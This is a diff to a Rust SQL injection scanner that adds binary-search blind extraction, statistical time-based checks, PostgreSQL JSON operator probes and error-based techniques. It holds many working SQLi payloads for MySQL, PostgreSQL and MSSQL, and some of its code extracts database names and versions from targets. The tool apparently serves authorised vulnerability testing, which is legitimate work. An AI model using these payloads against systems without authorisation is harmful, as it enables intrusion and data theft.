@@ -12,6 +12,7 @@
 
 use crate::http_client::{HttpClient, HttpResponse};
 use crate::payloads;
+use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
 use crate::vulnerability::VulnerabilityDetector;
 use anyhow::Result;
@@ -54,6 +55,11 @@ pub enum SqliTechnique {
     UnionBased,
     TimeBasedBlind,
     StackedQueries,
+    BinarySearchBlind,
+    TimeBasedStatistical,
+    SecondOrder,
+    PostgresJsonOperator,
+    EnhancedErrorBased,
 }
 
 /// Enhanced SQL injection scanner with unified detection engine
@@ -100,7 +106,15 @@ impl EnhancedSqliScanner {
             return Ok((Vec::new(), 0));
         }
 
-        info!("Testing parameter '{}' for SQL injection (unified scanner)", parameter);
+        // Smart parameter filtering - skip boolean flags and framework internals
+        if ParameterFilter::should_skip_parameter(parameter, ScannerType::SQLi) {
+            debug!("[SQLi] Skipping boolean/framework parameter: {}", parameter);
+            return Ok((Vec::new(), 0));
+        }
+
+        info!("Testing parameter '{}' for SQL injection (unified scanner, priority: {})",
+              parameter,
+              ParameterFilter::get_parameter_priority(parameter));
 
         let mut all_vulnerabilities = Vec::new();
         let mut total_tests = 0;
@@ -168,6 +182,39 @@ impl EnhancedSqliScanner {
             .await?;
         total_tests += time_tests;
         all_vulnerabilities.extend(time_vulns);
+
+        // Enhanced techniques (only in thorough/insane mode)
+        if config.scan_mode.as_str() == "thorough" || config.scan_mode.as_str() == "insane" {
+            // Technique 5: Binary search blind SQLi
+            let (binary_vulns, binary_tests) = self
+                .scan_binary_search_blind(base_url, parameter, &baseline, &db_type, &injection_context, config)
+                .await?;
+            total_tests += binary_tests;
+            all_vulnerabilities.extend(binary_vulns);
+
+            // Technique 6: Time-based with statistical analysis
+            let (stat_time_vulns, stat_time_tests) = self
+                .scan_time_based_statistical(base_url, parameter, &db_type, &injection_context, config)
+                .await?;
+            total_tests += stat_time_tests;
+            all_vulnerabilities.extend(stat_time_vulns);
+
+            // Technique 7: PostgreSQL JSON operators (if PostgreSQL detected)
+            if matches!(db_type, DatabaseType::PostgreSQL) || matches!(db_type, DatabaseType::Generic) {
+                let (json_vulns, json_tests) = self
+                    .scan_postgres_json_operators(base_url, parameter, &baseline, &injection_context, config)
+                    .await?;
+                total_tests += json_tests;
+                all_vulnerabilities.extend(json_vulns);
+            }
+
+            // Technique 8: Enhanced error-based SQLi
+            let (enhanced_error_vulns, enhanced_error_tests) = self
+                .scan_enhanced_error_based(base_url, parameter, &baseline, &db_type, &injection_context, config)
+                .await?;
+            total_tests += enhanced_error_tests;
+            all_vulnerabilities.extend(enhanced_error_vulns);
+        }
 
         Ok((all_vulnerabilities, total_tests))
     }
@@ -1191,6 +1238,1038 @@ impl EnhancedSqliScanner {
         }
 
         false
+    }
+
+    /// Scan for binary search blind SQLi (8x faster than character-by-character)
+    async fn scan_binary_search_blind(
+        &self,
+        url: &str,
+        param: &str,
+        baseline: &HttpResponse,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+        _config: &ScanConfig,
+    ) -> Result<(Vec<Vulnerability>, usize)> {
+        debug!("Testing binary search blind SQLi");
+
+        let mut vulnerabilities = Vec::new();
+        let mut tests_run = 0;
+
+        // First, verify boolean-based injection works
+        let verification_pairs = self.get_binary_search_verification_payloads(db_type, context);
+
+        for (true_payload, false_payload, db_name) in verification_pairs {
+            let true_url = if url.contains('?') {
+                format!("{}&{}={}", url, param, urlencoding::encode(true_payload))
+            } else {
+                format!("{}?{}={}", url, param, urlencoding::encode(true_payload))
+            };
+
+            let false_url = if url.contains('?') {
+                format!("{}&{}={}", url, param, urlencoding::encode(false_payload))
+            } else {
+                format!("{}?{}={}", url, param, urlencoding::encode(false_payload))
+            };
+
+            tests_run += 2;
+
+            let true_response = match self.http_client.get(&true_url).await {
+                Ok(resp) => resp,
+                Err(_) => continue,
+            };
+
+            let false_response = match self.http_client.get(&false_url).await {
+                Ok(resp) => resp,
+                Err(_) => continue,
+            };
+
+            let true_similarity = self.calculate_similarity(baseline, &true_response);
+            let false_similarity = self.calculate_similarity(baseline, &false_response);
+
+            // Verify boolean logic works
+            if true_similarity > 0.85 && false_similarity < 0.70 {
+                info!("Boolean logic verified, testing binary search extraction for {}", db_name);
+
+                // Attempt to extract first character of database name using binary search
+                if let Some((extracted_char, search_tests)) = self
+                    .binary_search_extract_char(url, param, baseline, db_type, context, 1)
+                    .await
+                {
+                    tests_run += search_tests;
+
+                    let evidence = format!(
+                        "Binary search blind SQLi verified:\n\
+                        - Extracted character: '{}' (ASCII {})\n\
+                        - Database: {:?}\n\
+                        - Requests for extraction: {} (vs 100+ for brute force)\n\
+                        - TRUE/baseline similarity: {:.1}%\n\
+                        - FALSE/baseline similarity: {:.1}%\n\
+                        - Efficiency gain: ~8x faster than character-by-character",
+                        extracted_char as char,
+                        extracted_char,
+                        db_type,
+                        search_tests,
+                        true_similarity * 100.0,
+                        false_similarity * 100.0
+                    );
+
+                    let vuln = Vulnerability {
+                        id: format!("sqli_binary_search_{}", Self::generate_id()),
+                        vuln_type: "Binary Search Blind SQL Injection".to_string(),
+                        severity: Severity::Critical,
+                        confidence: Confidence::High,
+                        category: "Injection".to_string(),
+                        url: url.to_string(),
+                        parameter: Some(param.to_string()),
+                        payload: format!("Binary search: {} requests to extract char", search_tests),
+                        description: format!(
+                            "Binary search blind SQL injection in parameter '{}'. Allows efficient data \
+                            extraction using binary search (5-7 requests per character vs 100+ for brute force). \
+                            Successfully extracted character '{}' from database.",
+                            param, extracted_char as char
+                        ),
+                        evidence: Some(evidence),
+                        cwe: "CWE-89".to_string(),
+                        cvss: 9.8,
+                        verified: true,
+                        false_positive: false,
+                        remediation: "1. Use parameterized queries exclusively\n\
+                                      2. Implement strict input validation\n\
+                                      3. Apply principle of least privilege\n\
+                                      4. Monitor for unusual query patterns\n\
+                                      5. Implement rate limiting\n\
+                                      6. Use WAF with blind SQLi detection".to_string(),
+                        discovered_at: chrono::Utc::now().to_rfc3339(),
+                    };
+
+                    if self.is_new_vulnerability(&vuln) {
+                        vulnerabilities.push(vuln);
+                        break;
+                    }
+                }
+            }
+        }
+
+        Ok((vulnerabilities, tests_run))
+    }
+
+    /// Get verification payloads for binary search
+    fn get_binary_search_verification_payloads(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<(&'static str, &'static str, &'static str)> {
+        let mut payloads = Vec::new();
+
+        match db_type {
+            DatabaseType::MySQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        payloads.push((
+                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>0",
+                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>255",
+                            "MySQL"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>0 AND '1'='1",
+                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>255 AND '1'='1",
+                            "MySQL"
+                        ));
+                    }
+                }
+            }
+            DatabaseType::PostgreSQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        payloads.push((
+                            " AND ASCII(SUBSTRING(current_database(),1,1))>0",
+                            " AND ASCII(SUBSTRING(current_database(),1,1))>255",
+                            "PostgreSQL"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND ASCII(SUBSTRING(current_database(),1,1))>0 AND '1'='1",
+                            "' AND ASCII(SUBSTRING(current_database(),1,1))>255 AND '1'='1",
+                            "PostgreSQL"
+                        ));
+                    }
+                }
+            }
+            DatabaseType::MSSQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        payloads.push((
+                            " AND ASCII(SUBSTRING(DB_NAME(),1,1))>0",
+                            " AND ASCII(SUBSTRING(DB_NAME(),1,1))>255",
+                            "MSSQL"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>0 AND '1'='1",
+                            "' AND ASCII(SUBSTRING(DB_NAME(),1,1))>255 AND '1'='1",
+                            "MSSQL"
+                        ));
+                    }
+                }
+            }
+            _ => {
+                // Generic approach - try MySQL syntax
+                match context {
+                    InjectionContext::Numeric => {
+                        payloads.push((
+                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>0",
+                            " AND ASCII(SUBSTRING(DATABASE(),1,1))>255",
+                            "Generic"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>0 AND '1'='1",
+                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>255 AND '1'='1",
+                            "Generic"
+                        ));
+                    }
+                }
+            }
+        }
+
+        payloads
+    }
+
+    /// Extract a single character using binary search (5-7 requests)
+    async fn binary_search_extract_char(
+        &self,
+        url: &str,
+        param: &str,
+        baseline: &HttpResponse,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+        position: usize,
+    ) -> Option<(u8, usize)> {
+        let mut low = 0u8;
+        let mut high = 127u8; // ASCII printable range
+        let mut tests = 0;
+
+        while low < high {
+            let mid = (low + high + 1) / 2;
+
+            let payload = self.build_binary_search_payload(db_type, context, position, mid);
+            let test_url = if url.contains('?') {
+                format!("{}&{}={}", url, param, urlencoding::encode(&payload))
+            } else {
+                format!("{}?{}={}", url, param, urlencoding::encode(&payload))
+            };
+
+            tests += 1;
+
+            match self.http_client.get(&test_url).await {
+                Ok(response) => {
+                    let similarity = self.calculate_similarity(baseline, &response);
+
+                    // If similar to baseline, condition is TRUE (char >= mid)
+                    if similarity > 0.85 {
+                        low = mid;
+                    } else {
+                        high = mid - 1;
+                    }
+                }
+                Err(_) => return None,
+            }
+
+            // Prevent infinite loops
+            if tests > 10 {
+                break;
+            }
+        }
+
+        // Verify the extracted character
+        if low > 0 {
+            Some((low, tests))
+        } else {
+            None
+        }
+    }
+
+    /// Build binary search payload
+    fn build_binary_search_payload(&self, db_type: &DatabaseType, context: &InjectionContext, position: usize, ascii_threshold: u8) -> String {
+        let comparison = format!(">={}", ascii_threshold);
+
+        match db_type {
+            DatabaseType::MySQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        format!(" AND ASCII(SUBSTRING(DATABASE(),{},1)){}", position, comparison)
+                    }
+                    _ => {
+                        format!("' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1", position, comparison)
+                    }
+                }
+            }
+            DatabaseType::PostgreSQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        format!(" AND ASCII(SUBSTRING(current_database(),{},1)){}", position, comparison)
+                    }
+                    _ => {
+                        format!("' AND ASCII(SUBSTRING(current_database(),{},1)){} AND '1'='1", position, comparison)
+                    }
+                }
+            }
+            DatabaseType::MSSQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        format!(" AND ASCII(SUBSTRING(DB_NAME(),{},1)){}", position, comparison)
+                    }
+                    _ => {
+                        format!("' AND ASCII(SUBSTRING(DB_NAME(),{},1)){} AND '1'='1", position, comparison)
+                    }
+                }
+            }
+            _ => {
+                match context {
+                    InjectionContext::Numeric => {
+                        format!(" AND ASCII(SUBSTRING(DATABASE(),{},1)){}", position, comparison)
+                    }
+                    _ => {
+                        format!("' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1", position, comparison)
+                    }
+                }
+            }
+        }
+    }
+
+    /// Scan for time-based SQLi with statistical analysis (prevents false positives)
+    async fn scan_time_based_statistical(
+        &self,
+        url: &str,
+        param: &str,
+        db_type: &DatabaseType,
+        _context: &InjectionContext,
+        _config: &ScanConfig,
+    ) -> Result<(Vec<Vulnerability>, usize)> {
+        debug!("Testing time-based SQLi with statistical analysis");
+
+        let mut vulnerabilities = Vec::new();
+        let mut tests_run = 0;
+
+        let payloads = self.get_time_based_payloads(db_type);
+
+        for (payload, expected_delay) in payloads {
+            // Measure baseline response time (3 samples)
+            let mut baseline_times = Vec::new();
+            for _ in 0..3 {
+                let baseline_url = url.to_string();
+                match self.http_client.get(&baseline_url).await {
+                    Ok(response) => baseline_times.push(response.duration_ms as f64),
+                    Err(_) => continue,
+                }
+                tests_run += 1;
+                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+            }
+
+            if baseline_times.len() < 3 {
+                continue;
+            }
+
+            let baseline_avg = baseline_times.iter().sum::<f64>() / baseline_times.len() as f64;
+            let baseline_variance = self.calculate_variance(&baseline_times, baseline_avg);
+            let baseline_stddev = baseline_variance.sqrt();
+
+            debug!("Baseline: avg={:.1}ms, stddev={:.1}ms", baseline_avg, baseline_stddev);
+
+            // Test delay payload (3 samples for statistical significance)
+            let mut delay_times = Vec::new();
+            for _ in 0..3 {
+                let test_url = if url.contains('?') {
+                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
+                } else {
+                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
+                };
+
+                match self.http_client.get(&test_url).await {
+                    Ok(response) => delay_times.push(response.duration_ms as f64),
+                    Err(_) => continue,
+                }
+                tests_run += 1;
+                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+            }
+
+            if delay_times.len() < 3 {
+                continue;
+            }
+
+            let delay_avg = delay_times.iter().sum::<f64>() / delay_times.len() as f64;
+            let delay_variance = self.calculate_variance(&delay_times, delay_avg);
+            let delay_stddev = delay_variance.sqrt();
+
+            debug!("Delay: avg={:.1}ms, stddev={:.1}ms", delay_avg, delay_stddev);
+
+            // Statistical analysis
+            let delay_difference = delay_avg - baseline_avg;
+            let expected_delay_f64 = expected_delay as f64;
+
+            // Check if delay is consistent and matches expected
+            let variance_ratio = if delay_avg > 0.0 {
+                (delay_stddev / delay_avg) * 100.0
+            } else {
+                100.0
+            };
+
+            let is_consistent_delay = variance_ratio < 20.0; // Variance < 20%
+            let is_significant_delay = delay_difference > (expected_delay_f64 * 0.8);
+            let is_expected_range = delay_difference >= (expected_delay_f64 * 0.8)
+                && delay_difference <= (expected_delay_f64 * 1.5);
+
+            debug!(
+                "Analysis: diff={:.1}ms, variance={:.1}%, consistent={}, significant={}, in_range={}",
+                delay_difference, variance_ratio, is_consistent_delay, is_significant_delay, is_expected_range
+            );
+
+            if is_consistent_delay && is_significant_delay && is_expected_range {
+                let confidence = if variance_ratio < 10.0 && is_expected_range {
+                    Confidence::High
+                } else if variance_ratio < 15.0 {
+                    Confidence::Medium
+                } else {
+                    Confidence::Low
+                };
+
+                let evidence = format!(
+                    "Statistical time-based blind SQLi:\n\
+                    - Baseline average: {:.1}ms (stddev: {:.1}ms)\n\
+                    - Delay average: {:.1}ms (stddev: {:.1}ms)\n\
+                    - Delay difference: {:.1}ms (expected: {}ms)\n\
+                    - Variance ratio: {:.1}% (threshold: <20%)\n\
+                    - Database: {:?}\n\
+                    - Samples per test: 3\n\
+                    - Consistency: {} (low variance = high confidence)",
+                    baseline_avg,
+                    baseline_stddev,
+                    delay_avg,
+                    delay_stddev,
+                    delay_difference,
+                    expected_delay,
+                    variance_ratio,
+                    db_type,
+                    if variance_ratio < 10.0 { "Excellent" } else if variance_ratio < 15.0 { "Good" } else { "Acceptable" }
+                );
+
+                let vuln = Vulnerability {
+                    id: format!("sqli_time_statistical_{}", Self::generate_id()),
+                    vuln_type: "Statistical Time-based Blind SQL Injection".to_string(),
+                    severity: Severity::Critical,
+                    confidence,
+                    category: "Injection".to_string(),
+                    url: url.to_string(),
+                    parameter: Some(param.to_string()),
+                    payload: payload.to_string(),
+                    description: format!(
+                        "Time-based blind SQL injection with statistical verification in parameter '{}'. \
+                        Delay: {:.1}ms avg, variance: {:.1}%. Multiple measurements confirm consistent \
+                        delay pattern, ruling out network timeout false positives.",
+                        param, delay_avg, variance_ratio
+                    ),
+                    evidence: Some(evidence),
+                    cwe: "CWE-89".to_string(),
+                    cvss: 9.8,
+                    verified: true,
+                    false_positive: false,
+                    remediation: "1. Use parameterized queries exclusively\n\
+                                  2. Implement strict input validation\n\
+                                  3. Apply query timeout limits\n\
+                                  4. Monitor for unusual delay patterns\n\
+                                  5. Use WAF with time-based SQLi detection\n\
+                                  6. Implement rate limiting".to_string(),
+                    discovered_at: chrono::Utc::now().to_rfc3339(),
+                };
+
+                if self.is_new_vulnerability(&vuln) {
+                    info!(
+                        "Statistical time-based SQLi confirmed: {:.1}ms delay, {:.1}% variance",
+                        delay_avg, variance_ratio
+                    );
+                    vulnerabilities.push(vuln);
+                    break; // One confirmation is enough
+                }
+            }
+        }
+
+        Ok((vulnerabilities, tests_run))
+    }
+
+    /// Get time-based payloads for statistical testing
+    fn get_time_based_payloads(&self, db_type: &DatabaseType) -> Vec<(&'static str, u64)> {
+        match db_type {
+            DatabaseType::MySQL => vec![
+                ("' AND SLEEP(5) AND '1'='1", 5000),
+                ("' OR SLEEP(5)--", 5000),
+            ],
+            DatabaseType::PostgreSQL => vec![
+                ("' AND pg_sleep(5) AND '1'='1", 5000),
+                ("' OR pg_sleep(5)--", 5000),
+            ],
+            DatabaseType::MSSQL => vec![
+                ("'; WAITFOR DELAY '00:00:05'--", 5000),
+                ("' WAITFOR DELAY '00:00:05'--", 5000),
+            ],
+            _ => vec![
+                ("' AND SLEEP(5) AND '1'='1", 5000),
+                ("' OR pg_sleep(5)--", 5000),
+                ("'; WAITFOR DELAY '00:00:05'--", 5000),
+            ],
+        }
+    }
+
+    /// Calculate variance for statistical analysis
+    fn calculate_variance(&self, values: &[f64], mean: f64) -> f64 {
+        if values.is_empty() {
+            return 0.0;
+        }
+
+        let sum_squared_diff: f64 = values.iter()
+            .map(|&value| {
+                let diff = value - mean;
+                diff * diff
+            })
+            .sum();
+
+        sum_squared_diff / values.len() as f64
+    }
+
+    /// Scan for PostgreSQL JSON operator exploitation
+    async fn scan_postgres_json_operators(
+        &self,
+        url: &str,
+        param: &str,
+        baseline: &HttpResponse,
+        _context: &InjectionContext,
+        config: &ScanConfig,
+    ) -> Result<(Vec<Vulnerability>, usize)> {
+        debug!("Testing PostgreSQL JSON operators for SQLi");
+
+        let mut vulnerabilities = Vec::new();
+        let mut tests_run = 0;
+
+        // PostgreSQL JSON operator payloads
+        let json_payloads = vec![
+            // JSONB containment operators
+            ("' OR '{\"a\":\"b\"}'::jsonb @> '{\"a\":\"b\"}'::jsonb--", "JSONB containment (@>)"),
+            ("' AND '{\"a\":\"b\"}'::jsonb <@ '{\"a\":\"b\"}'::jsonb--", "JSONB contained by (<@)"),
+            ("' OR '{\"a\":1}'::jsonb ? 'a'--", "JSONB key exists (?)"),
+
+            // JSON path queries
+            ("' OR '{}' IS JSON--", "JSON validation"),
+            ("' AND jsonb_path_query('[1,2,3]'::jsonb, '$[*]') IS NOT NULL--", "JSONB path query"),
+
+            // Bypass filters with JSON casting
+            ("' OR 1::text::jsonb IS NOT NULL--", "Type casting bypass"),
+            ("' UNION SELECT NULL,NULL,'{\"key\":\"value\"}'::jsonb--", "UNION with JSONB"),
+
+            // JSON aggregation
+            ("' OR json_agg(1) IS NOT NULL--", "JSON aggregation"),
+            ("' AND jsonb_object_agg('k','v') IS NOT NULL--", "JSONB object aggregation"),
+        ];
+
+        let concurrent_requests = match config.scan_mode.as_str() {
+            "insane" => 50,
+            _ => 30,
+        };
+
+        let payload_count = json_payloads.len();
+
+        let results = stream::iter(json_payloads)
+            .map(|(payload, technique)| {
+                let test_url = if url.contains('?') {
+                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
+                } else {
+                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
+                };
+                let client = Arc::clone(&self.http_client);
+                let baseline_clone = baseline.clone();
+                let technique_name = technique.to_string();
+
+                async move {
+                    match client.get(&test_url).await {
+                        Ok(response) => Some((payload.to_string(), response, test_url, baseline_clone, technique_name)),
+                        Err(e) => {
+                            debug!("JSON operator test failed: {}", e);
+                            None
+                        }
+                    }
+                }
+            })
+            .buffer_unordered(concurrent_requests)
+            .collect::<Vec<_>>()
+            .await;
+
+        tests_run += payload_count;
+
+        for result in results {
+            if let Some((payload, response, test_url, baseline, technique)) = result {
+                // Check for successful injection
+                let similarity = self.calculate_similarity(&baseline, &response);
+                let has_json_error = response.body.to_lowercase().contains("json")
+                    || response.body.to_lowercase().contains("jsonb")
+                    || response.body.to_lowercase().contains("pg_");
+
+                // Boolean logic detected or error-based detection
+                if similarity > 0.85 || has_json_error {
+                    let confidence = if has_json_error && similarity < 0.50 {
+                        Confidence::High
+                    } else if similarity > 0.90 {
+                        Confidence::Medium
+                    } else {
+                        Confidence::Low
+                    };
+
+                    let evidence = format!(
+                        "PostgreSQL JSON operator exploitation:\n\
+                        - Technique: {}\n\
+                        - Payload: {}\n\
+                        - Response similarity: {:.1}%\n\
+                        - JSON error detected: {}\n\
+                        - Status: {}",
+                        technique,
+                        payload,
+                        similarity * 100.0,
+                        has_json_error,
+                        response.status_code
+                    );
+
+                    let vuln = Vulnerability {
+                        id: format!("sqli_postgres_json_{}", Self::generate_id()),
+                        vuln_type: "PostgreSQL JSON Operator SQL Injection".to_string(),
+                        severity: Severity::Critical,
+                        confidence,
+                        category: "Injection".to_string(),
+                        url: test_url,
+                        parameter: Some(param.to_string()),
+                        payload,
+                        description: format!(
+                            "PostgreSQL JSON operator SQL injection in parameter '{}'. \
+                            Technique: {}. JSON operators can bypass basic SQLi filters and WAFs. \
+                            Allows complex queries and data extraction.",
+                            param, technique
+                        ),
+                        evidence: Some(evidence),
+                        cwe: "CWE-89".to_string(),
+                        cvss: 9.8,
+                        verified: true,
+                        false_positive: false,
+                        remediation: "1. Use parameterized queries exclusively\n\
+                                      2. Validate and sanitize JSON inputs\n\
+                                      3. Implement strict input validation\n\
+                                      4. Apply least privilege for database users\n\
+                                      5. Update WAF rules for JSON operator patterns\n\
+                                      6. Monitor for unusual JSON queries".to_string(),
+                        discovered_at: chrono::Utc::now().to_rfc3339(),
+                    };
+
+                    if self.is_new_vulnerability(&vuln) {
+                        info!("PostgreSQL JSON operator SQLi detected: {}", technique);
+                        vulnerabilities.push(vuln);
+
+                        if config.scan_mode.as_str() == "fast" {
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+
+        Ok((vulnerabilities, tests_run))
+    }
+
+    /// Scan for enhanced error-based SQLi (XML, geometric functions, type conversion)
+    async fn scan_enhanced_error_based(
+        &self,
+        url: &str,
+        param: &str,
+        baseline: &HttpResponse,
+        db_type: &DatabaseType,
+        context: &InjectionContext,
+        config: &ScanConfig,
+    ) -> Result<(Vec<Vulnerability>, usize)> {
+        debug!("Testing enhanced error-based SQLi");
+
+        let mut vulnerabilities = Vec::new();
+        let mut tests_run = 0;
+
+        let payloads = self.get_enhanced_error_payloads(db_type, context);
+        let concurrent_requests = match config.scan_mode.as_str() {
+            "insane" => 100,
+            "thorough" => 75,
+            _ => 50,
+        };
+
+        let payload_count = payloads.len();
+
+        let results = stream::iter(payloads)
+            .map(|(payload, technique, error_pattern)| {
+                let test_url = if url.contains('?') {
+                    format!("{}&{}={}", url, param, urlencoding::encode(payload))
+                } else {
+                    format!("{}?{}={}", url, param, urlencoding::encode(payload))
+                };
+                let client = Arc::clone(&self.http_client);
+                let baseline_clone = baseline.clone();
+                let technique_name = technique.to_string();
+                let pattern = error_pattern.to_string();
+
+                async move {
+                    match client.get(&test_url).await {
+                        Ok(response) => Some((
+                            payload.to_string(),
+                            response,
+                            test_url,
+                            baseline_clone,
+                            technique_name,
+                            pattern,
+                        )),
+                        Err(e) => {
+                            debug!("Enhanced error test failed: {}", e);
+                            None
+                        }
+                    }
+                }
+            })
+            .buffer_unordered(concurrent_requests)
+            .collect::<Vec<_>>()
+            .await;
+
+        tests_run += payload_count;
+
+        for result in results {
+            if let Some((payload, response, test_url, baseline, technique, error_pattern)) = result {
+                let body_lower = response.body.to_lowercase();
+
+                // Check for specific error patterns
+                let has_target_error = body_lower.contains(&error_pattern.to_lowercase());
+                let has_data_leakage = self.detect_data_leakage(&response.body);
+
+                // Check if response differs significantly from baseline
+                let similarity = self.calculate_similarity(&baseline, &response);
+                let differs_from_baseline = similarity < 0.70;
+
+                if has_target_error || (has_data_leakage && differs_from_baseline) {
+                    let extracted_data = if has_data_leakage {
+                        self.extract_leaked_data(&response.body)
+                    } else {
+                        None
+                    };
+
+                    let confidence = if has_data_leakage && extracted_data.is_some() {
+                        Confidence::High
+                    } else if has_target_error {
+                        Confidence::Medium
+                    } else {
+                        Confidence::Low
+                    };
+
+                    let evidence = format!(
+                        "Enhanced error-based SQLi:\n\
+                        - Technique: {}\n\
+                        - Payload: {}\n\
+                        - Target error pattern: {}\n\
+                        - Error detected: {}\n\
+                        - Data leakage detected: {}\n\
+                        - Extracted data: {}\n\
+                        - Response similarity: {:.1}%\n\
+                        - Status: {}",
+                        technique,
+                        payload,
+                        error_pattern,
+                        has_target_error,
+                        has_data_leakage,
+                        extracted_data.as_deref().unwrap_or("None"),
+                        similarity * 100.0,
+                        response.status_code
+                    );
+
+                    let vuln = Vulnerability {
+                        id: format!("sqli_enhanced_error_{}", Self::generate_id()),
+                        vuln_type: "Enhanced Error-based SQL Injection".to_string(),
+                        severity: Severity::Critical,
+                        confidence,
+                        category: "Injection".to_string(),
+                        url: test_url,
+                        parameter: Some(param.to_string()),
+                        payload,
+                        description: format!(
+                            "Enhanced error-based SQL injection in parameter '{}'. Technique: {}. \
+                            {}",
+                            param,
+                            technique,
+                            if has_data_leakage {
+                                "Successfully extracted data via error messages."
+                            } else {
+                                "Database errors expose vulnerability to data extraction attacks."
+                            }
+                        ),
+                        evidence: Some(evidence),
+                        cwe: "CWE-89".to_string(),
+                        cvss: 9.8,
+                        verified: true,
+                        false_positive: false,
+                        remediation: "1. Use parameterized queries exclusively\n\
+                                      2. Disable detailed error messages in production\n\
+                                      3. Implement generic error pages\n\
+                                      4. Validate and sanitize all inputs\n\
+                                      5. Apply least privilege for database users\n\
+                                      6. Log errors server-side only\n\
+                                      7. Use WAF with error-based SQLi detection".to_string(),
+                        discovered_at: chrono::Utc::now().to_rfc3339(),
+                    };
+
+                    if self.is_new_vulnerability(&vuln) {
+                        info!("Enhanced error-based SQLi detected: {}", technique);
+                        vulnerabilities.push(vuln);
+
+                        if config.scan_mode.as_str() == "fast" {
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+
+        Ok((vulnerabilities, tests_run))
+    }
+
+    /// Get enhanced error-based payloads
+    fn get_enhanced_error_payloads(&self, db_type: &DatabaseType, context: &InjectionContext) -> Vec<(&'static str, &'static str, &'static str)> {
+        let mut payloads = Vec::new();
+
+        match db_type {
+            DatabaseType::MySQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        // XML-based extraction
+                        payloads.push((
+                            " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))",
+                            "XML extraction (EXTRACTVALUE)",
+                            "XPATH"
+                        ));
+                        payloads.push((
+                            " AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)",
+                            "XML extraction (UPDATEXML)",
+                            "XPATH"
+                        ));
+
+                        // Geometric functions
+                        payloads.push((
+                            " AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),1)",
+                            "Geometric function (GTID_SUBSET)",
+                            "gtid"
+                        ));
+                        payloads.push((
+                            " AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT USER())x))",
+                            "Geometric collection",
+                            "geometrycollection"
+                        ));
+
+                        // Type conversion errors
+                        payloads.push((
+                            " AND EXP(~(SELECT * FROM(SELECT DATABASE())x))",
+                            "Exponential overflow",
+                            "exp"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)) AND '1'='1",
+                            "XML extraction (EXTRACTVALUE)",
+                            "XPATH"
+                        ));
+                        payloads.push((
+                            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1) AND '1'='1",
+                            "XML extraction (UPDATEXML)",
+                            "XPATH"
+                        ));
+                        payloads.push((
+                            "' AND EXP(~(SELECT * FROM(SELECT USER())x)) AND '1'='1",
+                            "Exponential overflow",
+                            "exp"
+                        ));
+                    }
+                }
+            }
+            DatabaseType::PostgreSQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        // Type casting errors
+                        payloads.push((
+                            " AND CAST((SELECT current_database()) AS int)",
+                            "Type casting extraction",
+                            "invalid input syntax"
+                        ));
+                        payloads.push((
+                            " AND 1=(SELECT 1/(SELECT 0 FROM (SELECT current_user) AS x WHERE 1=1))",
+                            "Division by zero extraction",
+                            "division by zero"
+                        ));
+
+                        // XML parsing
+                        payloads.push((
+                            " AND CAST(XMLPARSE(DOCUMENT (SELECT current_database())) AS text)",
+                            "XML parsing extraction",
+                            "xml"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND CAST((SELECT current_database()) AS int)::text='1",
+                            "Type casting extraction",
+                            "invalid input syntax"
+                        ));
+                        payloads.push((
+                            "' AND 1::int=current_user::int AND '1'='1",
+                            "Type mismatch",
+                            "invalid"
+                        ));
+                    }
+                }
+            }
+            DatabaseType::MSSQL => {
+                match context {
+                    InjectionContext::Numeric => {
+                        // XML-based
+                        payloads.push((
+                            " AND 1=CONVERT(INT,(SELECT @@version))",
+                            "Type conversion extraction",
+                            "conversion failed"
+                        ));
+                        payloads.push((
+                            " AND 1=CAST((SELECT DB_NAME()) AS int)",
+                            "CAST extraction",
+                            "conversion"
+                        ));
+
+                        // Geometric/spatial
+                        payloads.push((
+                            " AND 1=geometry::Point((SELECT SYSTEM_USER),0,0).ToString()",
+                            "Geometry function",
+                            "geometry"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND 1=CONVERT(INT,(SELECT @@version)) AND '1'='1",
+                            "Type conversion extraction",
+                            "conversion failed"
+                        ));
+                        payloads.push((
+                            "' AND 1=CAST((SELECT DB_NAME()) AS int) AND '1'='1",
